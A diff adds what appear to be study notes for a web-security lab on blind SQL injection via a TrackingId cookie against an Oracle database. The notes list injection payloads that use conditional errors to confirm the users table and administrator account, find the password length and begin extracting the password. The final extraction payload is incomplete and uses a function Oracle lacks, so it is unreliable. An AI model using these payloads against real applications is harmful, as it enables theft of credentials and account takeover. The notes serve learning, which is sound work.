@@ -1,0 +1,77 @@
+- Blind SQLi - Tracking Id cookie
+
+- The result of the SQL query are not returned and the application
+does not respond any differently based on whether the query
+returns any row.
+
+- DB -> users table > username, password columns.
+
+Goal:
+1- Enumerate over the password of administrator.
+2- Login as the administrator user.
+
+
+Process:
+
+TrackingId=3razirNdal2rG3Ye' -> internal Error.
+TrackingId=3razirNdal2rG3Ye'' -> No error, that means there's a SQLi here.
+
+' and 1=1-- -> No error
+' and 1=2-- -> No error, no different behaviour.
+
+that means I cannot trigger boolean conditions, because the application does not respond differently when dealing 
+with series of True/False conditions.
+
+So, I will try to make the app to trigger SQL Erros based on some condition
+
+' || (select '') || ' -> Error, so maybe because the dbms is something else, so i'll try Oracle.
+
+In oracle every select statement must be followed by FROM clause
+so i'll use built-in table called dual
+
+
+' || (select '' from dual ) || ' -> No error.
+
+dbms: oracle.
+
+Prove that there's users table in the db:
+' || (select '' from users where rownum=1 ) || ' -> No Error
+I used rownum here to limit only the incoming row to ignore Errors
+that may arise.
+
+Prove that administrator user exist in users table
+
+' || (select '' from users where username = 'administrator') || ' -> No error, administrator user exist
+
+triggering some SQL Erros based on some condition
+CASE expression from Oracle: https://docs.oracle.com/cd/B19306_01/server.102/b14200/expressions004.htm
+
+' || (select CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> NO error cuz the condition is False.
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> error cuz the condition is True.
+
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator') || ' -> Error cuz the username exist
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'something') || ' -> no Error cuz the username does not exist.
+
+Get the length of the password:
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and LENGTH(password) > 1) || ' -> Error cuz the username exist
+
+I fired the intruder to check the length of the password and got 200 ok at the number 20 > length = 20.
+
+
+Enumerate over the password one at a time:
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and substring(password, 1, 1) || ' ->
+
+
+
+now, try to automate this.
+
+
+
+
+
+
+
+
+
